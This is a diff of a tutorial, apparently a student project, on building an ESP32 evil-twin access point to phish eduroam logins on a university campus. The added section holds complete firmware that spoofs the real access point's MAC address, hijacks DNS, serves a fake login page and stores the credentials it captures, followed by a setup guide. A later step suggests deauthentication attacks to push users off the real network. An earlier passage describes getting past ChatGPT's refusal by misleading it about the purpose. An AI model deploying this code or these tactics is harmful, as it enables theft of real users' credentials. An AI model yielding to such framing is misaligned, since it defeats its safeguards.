@@ -35,7 +35,7 @@ What we cannot do :
 Taking this into consideration, we will ask chatgpt to create lightweight copies of the login html pages used by the university APs. And we won't try to use deauthentication* but we will instead leverage the random disconnections and limited coverage of the eduroam network on the campus.
 
 
-\* see STEP 8
+\* see STEP 9
 
 
 Short summary of the process: 
@@ -79,7 +79,7 @@ This is where we run into our first problem. As you can see from the image, when
 As we saw, the LLM model is censured. We can easily fix this problem by "lying" (in this case telling the truth) to the LLM.
 
 As you can see from the image, the LLM is happy to help now and we can proceed. 
-The basic approach we will follow when talking to the LLM is the one where we don't bury it with details from the start. We want a solid base and only after we will work up to the details. That is why in this prompt we are not asking it to create a specific fake login website and other specific requirements that would complicate its job. We are building the foundations, brick by brick.
+The basic approach we will follow when talking to the LLM is the one where we don't bury it with details from the start. We want a solid base and only after we will work our way up to the details. That is why in this prompt we are not asking it to create a specific fake login website and other specific requirements that would complicate its job. We are building the foundations, brick by brick.
 
 ![Modified request](images/PositivePromptAndResponse.png)
 
@@ -260,16 +260,152 @@ just before the line where our ssid is set (```WiFi.softAP(ssid);```) and aftert
 
 
 
-## STEP 7: Generalizing the code and providing a guide to use it
+## STEP 8: Generalizing the code and providing a guide to use it
 Now that the specific code is working we proceed by generalizing the code so it can be easily adapted for other purposes (not just eduroam) and we provide a short guide on how to use it down below.
 
 Code:
 ```cpp
+#include <WiFi.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+#include <SPIFFS.h>
+
+extern "C" {
+  #include "esp_wifi.h"   // API Needed to handle MAC spoofing
+}
+
+// =================== Network Configuration =======================
+const char* ssid = "choose_ssid ";  // Evil Twin SSID, leave space after name to avoid windows renaming your ssid
+IPAddress apIP(192, 168, 4, 1);
+IPAddress netMsk(255, 255, 255, 0);
+
+// ====================== Server Setup =============================
+DNSServer dnsServer;
+WebServer server(80);
+
+String capturedData = "";
+
+// ===================== Credential Capture Handler =====================================
+void handleLogin() {
+  String user = server.arg("username"); // used to capture data
+  String pass = server.arg("password"); // used to capture data
+  capturedData += "Username: " + user + " | Password: " + pass + "\n";
+
+  Serial.println("[+] Captured: " + user + " | " + pass);
+  server.send(200, "text/html", "<h2>Authentication successful. You may now use choose_ssid.</h2>"); //fake page that informs that everything is successful
+}
+
+// ========================== View Captured Data ===========================
+void handleData() {
+  server.send(200, "text/plain", capturedData);
+}
+
+// ============================= Captive Portal Handler ====================================
+void handlePortal() {
+  // Serve index.html from SPIFFS when redirected to /portal
+  File file = SPIFFS.open("/index.html", "r"); //load and open the file from SPIFFS
+  if (!file) {
+    server.send(500, "text/plain", "Login page not found");
+    return;
+  }
+  server.streamFile(file, "text/html");
+  file.close(); // Close the file 
+}
+
+// ====================== HANDLE POLICY (not necessary, if login has policy can be used to redirect here) ==============================
+void handlePolicy() {
+  // Serve policy.html from SPIFFS when redirected to /policy
+  File file = SPIFFS.open("/policy.html", "r");
+  if (!file) {
+    server.send(500, "text/plain", "Policy page not found");
+    return;
+  }
+  server.streamFile(file, "text/html");
+  file.close();
+}
+
+// ====================== Fallback Redirect for Unknown Requests =================================
+// this will redirect unknown http req's to our captive portal page
+// based on this redirect various systems could detect that WiFi AP has a captive portal page
+void handleNotFound() {
+  server.sendHeader("Location", "/portal", true);
+  server.send(302, "text/plain", "Redirecting to captive portal");
+}
+
+
+void setup() {
+  Serial.begin(115200);
+  delay(1000);
+
+  // ======== Wi-Fi AP Configuration ======
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(apIP, apIP, netMsk);
+
+  // ======== Setting Spoofed MAC ==========
+  uint8_t customMAC[] = { 0x9C, 0x8C, 0xD8, 0xC9, 0xCA, 0x50 }; // Replace with target MAC
+  esp_wifi_set_mac(WIFI_IF_AP, customMAC);
+  delay(500);
+
+  // ======== Wi-Fi AP Configuration cont. ======
+  WiFi.softAP(ssid);
+  delay(500);
+  Serial.println("[*] Access Point 'choose_ssid' started");
+  Serial.println(WiFi.softAPIP());
+  Serial.println(WiFi.softAPmacAddress());
+  
+  // ========== SPIFFS Mount chechk ================
+  if (!SPIFFS.begin(true)) {
+    Serial.println("SPIFFS Mount Failed!");
+    return;
+  }
+
+  // ============== DNS Spoof All Domains ================
+  if (dnsServer.start(53, "*", apIP)) {
+    Serial.println("[*] DNS server started in captive mode");
+  } else {
+    Serial.println("[!] Failed to start DNS server");
+  }
+
+  // =================================== Routes ======================================
+  server.on("/", []() {
+    server.sendHeader("Location", "/portal", true);
+    server.send(302, "text/plain", "");
+  });
+
+  
+  server.on("/portal", handlePortal);                   // Captive portal page
+  server.on("/login", HTTP_POST, handleLogin);          // Form POST
+  server.on("/data", HTTP_GET, handleData);             // View captured credentials
+  server.on("/policy", handlePolicy);                     // Policy Page
+  server.serveStatic("/logo.png", SPIFFS, "/logo.png"); // Serve logo (you need to serve the file you insert into spiffs!)
+  server.serveStatic("/LogoPolicy.png", SPIFFS, "/LogoPolicy.png"); // Serve Policy logo
+  server.onNotFound(handleNotFound);                    // Redirect everything else
+
+  server.begin();
+  Serial.println("[*] Web server started");
+}
+
+
+
+
+void loop() {
+  dnsServer.processNextRequest();
+  server.handleClient();
+}
+
 
 ```
 
+**IMPORTANT NOTE**: This code is designed to be used as a test and example of what an ESP32 can do in terms of evil twin attacks. It is designed to be used on the ESP32 temporarly, in order of minutes, not for a prolonged period of time. Also, the code is not designed to handle weird imputs that could provoke injection problems. 
 
-Guide: 
+For this reaason the following issues need to be fixed if someone wants to use this code on an ESP32 for prolonged periods of time.
+
+ISSUES: 
++ This code is trusting ```server.arg()``` blindly and it does not validate inputs to avoid injection issues or crashes.
++ Over time, capturedData will grow in memory. Leading to out-of-memory issues. 
+
+
+### Guide: 
 + Install the Legacy Arduino IDE v1.8.19
 + Set up the Arduino ESP32 filesystem uploader plugin (```https://github.com/me-no-dev/arduino-esp32fs-plugin```)
 + Create a folder
@@ -284,7 +420,7 @@ Guide:
 
 
 
-STEP 8 (OPTIONAL): Deauthenticator
+## STEP 9 (OPTIONAL): Deauthenticator
 To aid the process of users connecting to our evil twin AP we will try to send deauthentication packets to disconnect the victim from the real acess point, thus increasing the probability of getting a victim to connect to our "evil" AP. 
 As we easily discovered, by looking at the wifi settings on android and windows, eduraom uses WPA3 - Enterprise which poses a problem since it strictly requires PMF (Protected Management Frames) which we cannot forge as we cannot sign them. 
 But we also know that sometimes eduraom falls back onto older standards like WPA2 - Enterprise for supporting older devices. Since in WPA2 - Enterprise specification PMF are optional, we can try to use the tool at ```https://deauther.com``` and an ESP8266 to send deauthentication packets to victims and hopefully boost our success rate by disconnecting users from the real AP. 
